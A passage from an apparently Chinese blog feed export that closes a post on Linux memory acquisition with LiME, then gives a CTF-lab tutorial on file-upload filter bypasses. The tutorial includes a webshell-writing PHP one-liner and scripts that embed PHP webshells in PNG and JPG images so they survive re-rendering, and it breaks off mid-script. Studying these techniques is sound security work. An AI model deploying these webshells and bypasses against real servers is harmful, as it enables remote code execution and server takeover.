<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-9.png"></p>
<h2 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h2><p>在美亚柏科微信公众号申请，会给一个压缩包</p>
<p>解压密码：<code>my#pico4008886688</code>或者<code>pico@4008886688</code></p>
<h1 id="内存提取"><a href="#内存提取" class="headerlink" title="内存提取"></a>内存提取</h1><blockquote>
<p>完整的内存数据包括两部分: 物理内存数据和页面交换文件数据。</p>
</blockquote>
<blockquote>
<p>物理内存通常是一个特殊的内核对象, 比如, 在<code>Windows</code>系统中, 物理内存是内核内存区对象, 即 <code>\\Device\\PhysicalMemory</code>; 在<code>Unix/Linux</code>系统中, 物理内存为<code>/dev/mem</code>和<code>/dev/kmem</code>。 只要能读取该内核对象, 就能获取物理内存数据.</p>
</blockquote>
<blockquote>
<p>物理机上使用工具比如<code>Win32dd/Win64dd</code>,<code>Memoryze</code>,<code>DumpIt</code>,<code>FastDump</code>。在虚拟机上，获取内存是很容易的，你可以暂停VM并取出<code>.vmem</code>文件。</p>
</blockquote>
<p>这里采用<a href="https://github.com/504ensicslabs/lime">lime</a>制作内存镜像</p>
<p>以centos7为例子</p>
<p>安装基本软件<br><code>yum install -y gcc make gcc-c++ git kernel-devel</code></p>
<p>下载lime<br><code>git clone https://github.com/504ensicsLabs/LiME.git</code></p>
<p>编译<br><code>cd LiME/src &amp;&amp; make</code></p>
<p>如果出现以下报错</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">make -C /lib/modules/3.10.0-1127.el7.x86_64/build M=&quot;/root/LiME/src&quot; modules<br>make: *** /lib/modules/3.10.0-1127.el7.x86_64/build: 没有那个文件或目录。 停止。<br>make: *** [default] 错误 2<br></code></pre></td></tr></table></figure>

<p>说明系统自身的内核版本和<code>kernel-devel</code>安装的内核不匹配</p>
<p>使用<code>uname -r</code>查询内核版本：<code>3.10.0-1127.el7.x86_64</code></p>
<p>使用<code>rpm -qa kernel-devel </code>查看安装的版本：<code>kernel-devel-3.10.0-1160.88.1.el7.x86_64</code></p>
<p>解决方法：<code>yum upgrade</code></p>
<p>重新编译会生成一个名字和内核版本相同的<code>.ko</code>文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/quzheng-10.png"></p>
<p>使用<code>lime</code>工具导出内存文件</p>
<p><code>insmod ./lime-3.10.0-1160.88.1.el7.x86_64.ko &quot;path=/root/centos.line format=lime&quot;</code></p>
<p>参考文章：<br><a href="https://r0fus0d.blog.ffffffff0x.com/post/memory-forensics/">内存取证(总结篇)</a><br><a href="https://xz.aliyun.com/t/11800">最近遇到的Linux内核内存取证小分析</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>misc</tag>
        <tag>内存取证</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>关于文件上传的一点总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>部分靶场用的是国光师傅的<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">文件上传靶场项目</a></p>
<h1 id="JavaScript绕过"><a href="#JavaScript绕过" class="headerlink" title="JavaScript绕过"></a>JavaScript绕过</h1><p>从最简单的js开始<br>首先我们要判断是否为js前端验证<br>F12查看代码，已经很明显了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj1.jpg"></p>
<p>js绕过的方法较多，常见的有抓包改后缀，禁用js或是直接修改代码<br>我比较喜欢用chrome的禁用js<br>访问chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript?search&#x3D;java<br>添加禁用即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj2.jpg"></p>
<h1 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h1><p>MIME验证是对数据包的Content-Type类型进行验证<br>我们只需要修改Content-Type类型即可绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj3.jpg"><br>常见的类型</p>
<blockquote>
<p>text&#x2F;plain（纯文本）<br>text&#x2F;html（HTML文档）<br>text&#x2F;javascript（js代码）<br>application&#x2F;xhtml+xml（XHTML文档）<br>image&#x2F;gif（GIF图像）<br>image&#x2F;jpeg（JPEG图像）<br>image&#x2F;png（PNG图像）<br>video&#x2F;mpeg（MPEG动画）<br>application&#x2F;octet-stream（二进制数据）<br>application&#x2F;pdf（PDF文档）<br>application&#x2F;(编程语言) 该种语言的代码<br>application&#x2F;msword（Microsoft Word文件）<br>message&#x2F;rfc822（RFC 822形式）<br>multipart&#x2F;alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）<br>application&#x2F;x-www-form-urlencoded（ POST方法提交的表单）<br>multipart&#x2F;form-data（POST提交时伴随文件上传的表单）</p>
</blockquote>
<h1 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h1><p>顾名思义，就是对文件头的验证<br>用010 Editor等十六进制编辑器查看并修改<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj4.jpg"><br>当然，一个标准的图片马是没有这个问题的<br>常见的文件头</p>
<blockquote>
<p>PNG 的文件头为<br>十六进制的 89 50 4E 47 0D 0A 1A 0A</p>
</blockquote>
<blockquote>
<p>GIF(相当于文本的GIF89a)：<br>47 49 46 38 39 61</p>
</blockquote>
<blockquote>
<p>JPG 的文件头为<br>FF D8 FF E0 00 10 4A 46 49 46</p>
</blockquote>
<blockquote>
<p>ZIP 的文件头为<br>50 4B 03 04</p>
</blockquote>
<blockquote>
<p>RAR 的文件头为<br>52 61 72 21</p>
</blockquote>
<h1 id="黑名单关键词替换绕过"><a href="#黑名单关键词替换绕过" class="headerlink" title="黑名单关键词替换绕过"></a>黑名单关键词替换绕过</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],UPLOAD_PATH.<span class="hljs-variable">$name</span>))<br></code></pre></td></tr></table></figure>
<p>黑名单关键词替换为空的操作是一种不安全的写法<br>可以使用双写来绕过<br>如<br>test.phphpp</p>
<h1 id="windows环境"><a href="#windows环境" class="headerlink" title="windows环境"></a>windows环境</h1><p>还是上一题的代码<br>但是在windows环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用</p>
<h1 id="黑名单缺陷"><a href="#黑名单缺陷" class="headerlink" title="黑名单缺陷"></a>黑名单缺陷</h1><p>白名单是设置能通过的用户，白名单以外的用户都不能通过。<br>黑名单是设置不能通过的用户，黑名单以外的用户都能通过。<br>所以一般情况下白名单比黑名单限制的用户要更多一些<br>这里利用的是php的多后缀<br>默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP</p>
<h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><p>上传一个.htaccess文件，文件内容如下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj5.jpg"><br>意思是这个目录下的所有以.png为后缀的文件都会被解析为php执行<br>然后上传一个1.png<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj6.jpg"><br>访问上传的1.png<br>执行成功<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj7.jpg"></p>
<h1 id="00截断–1"><a href="#00截断–1" class="headerlink" title="00截断–1"></a>00截断–1</h1><p>想要利用00截断需要一些条件：</p>
<blockquote>
<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题<br>magic_quotes_gpc需要为OFF状态</p>
</blockquote>
<p>0x00，%00，&#x2F;00之类的截断，都是一样的，只是不同表示而已<br>上传1.png，并构造一个new.php<br>即&#x2F;upload&#x2F;new.php%001.png，经过解析后1.png被截断<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj8.jpg"><br>访问new.php<br>执行成功<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj9.jpg"></p>
<h1 id="00截断–2"><a href="#00截断–2" class="headerlink" title="00截断–2"></a>00截断–2</h1><p>POST型的00截断<br>需要手动解码一次<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj10.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj11.jpg"></p>
<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>例子:先存储文件，再判断是否合法，然后又删除<br>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”</p>
<p>攻击:首先上传一个php文件<br>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<p><code>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;</code><br>利用burp的抓包和爆破功能即可实现条件竞争（或是利用脚本，如较为方便的python）<br>将上传的shell无限发送，另一边无限访问这个shell，趁上传和删除的间隙生成webshell</p>
<h1 id="move-uploaded-file绕过"><a href="#move-uploaded-file绕过" class="headerlink" title="move_uploaded_file绕过"></a>move_uploaded_file绕过</h1><p><code>move_uploaded_file($temp_file, $img_path)</code></p>
<blockquote>
<p>上述函数除了 PHP 5.3.4 以下的版本可以用 00 截断绕过，就真的没有其他缺陷了吗？</p>
</blockquote>
<p>当 $img_path 可控的时候，还会忽略掉 $img_path 后面的 &#x2F;.</p>
<p>梅子酒师傅的这篇<a href="https://meizjm3i.github.io/2018/04/17/%E4%BB%8E0CTF%E5%88%86%E6%9E%90move-uploaded-file%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%89%B9%E7%82%B9/">文章</a>已经解释的很详细了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj12.jpg"></p>
<h1 id="图片二次渲染绕过"><a href="#图片二次渲染绕过" class="headerlink" title="图片二次渲染绕过"></a>图片二次渲染绕过</h1><blockquote>
<p>imagecreatefrom 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的</p>
</blockquote>
<h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>先上传一个GIF<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/1.gif"></p>
<p>1.gif是上传的<br>2.gif是渲染后的<br>使用010的文件比较功能，其中灰的部分就是内容一致的部分<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj13.jpg"></p>
<p>将php代码插入到灰色部分之中即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj14.jpg"><br>上传后再导出，发现php代码并没有被渲染掉<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj15.jpg"></p>
<h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>直接使用大牛的脚本了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>用phpstudy等软件搭建一个本地环境运行即可<br>把木马和脚本放在同一目录下，访问php即可</p>
<h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>同样直接放脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;  <span class="hljs-comment">//修改为需要的代码即可</span><br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) 